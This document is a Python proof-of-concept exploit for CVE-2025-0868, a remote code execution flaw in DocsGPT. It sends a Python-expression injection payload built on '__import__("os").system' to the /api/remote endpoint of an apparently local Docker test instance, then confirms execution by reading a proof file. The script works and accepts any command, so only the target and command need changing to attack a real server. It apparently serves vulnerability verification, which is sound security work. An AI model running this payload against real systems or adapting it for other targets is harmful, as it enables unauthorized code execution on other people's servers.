#!/usr/bin/env python3
import requests
import time
import subprocess

TARGET_URL = "http://localhost:5000"
PROOF_FILE = "/tmp/cve-2025-0868-proof.txt"
PROOF_CONTENT = "CVE-2025-0868-RCE-VERIFIED"

def check_service(url, retries=30, interval=3):
    for i in range(retries):
        try:
            r = requests.post(f"{url}/api/remote", data={"user": "test", "source": "reddit", "name": "check", "data": "{}"}, timeout=5)
            if r.status_code == 200:
                return True
        except:
            pass
        print(f"[*] Waiting for service... ({i+1}/{retries})")
        time.sleep(interval)
    return False

def exploit(url, command):
    payload = f'(__import__("os").system("{command}"), {{"client_id": "test"}})[1]'
    data = {
        "user": "attacker",
        "source": "reddit", 
        "name": "exploit",
        "data": payload
    }
    try:
        r = requests.post(f"{url}/api/remote", data=data, timeout=30)
        return r.status_code == 200 and r.json().get("success")
    except:
        return False

def verify_rce():
    result = subprocess.run(
        ["docker", "exec", "docsgpt-worker-vuln", "cat", PROOF_FILE],
        capture_output=True, text=True
    )
    return PROOF_CONTENT in result.stdout

def main():
    print("=" * 50)
    print("CVE-2025-0868 PoC - DocsGPT RCE")
    print("=" * 50)
    
    if not check_service(TARGET_URL):
        print("[-] Service not available")
        return False
    
    print("[+] Service is ready")
    
    cmd = f'echo {PROOF_CONTENT} > {PROOF_FILE}'
    print(f"[*] Sending exploit payload...")
    
    if not exploit(TARGET_URL, cmd):
        print("[-] Exploit request failed")
        return False
    
    print("[+] Exploit request accepted")
    print("[*] Waiting for async execution...")
    time.sleep(3)
    
    if verify_rce():
        print("[+] RCE VERIFIED - Vulnerability confirmed!")
        with open("result.log", "w") as f:
            f.write(f"CVE-2025-0868 RCE Verification\n")
            f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {TARGET_URL}/api/remote\n")
            f.write(f"Status: VULNERABLE\n")
            f.write(f"Proof: File {PROOF_FILE} created with content '{PROOF_CONTENT}'\n")
        return True
    else:
        print("[-] Could not verify RCE")
        return False

if __name__ == "__main__":
    success = main()
    print("=" * 50)
    print("VULNERABLE" if success else "NOT VULNERABLE")
    print("=" * 50)
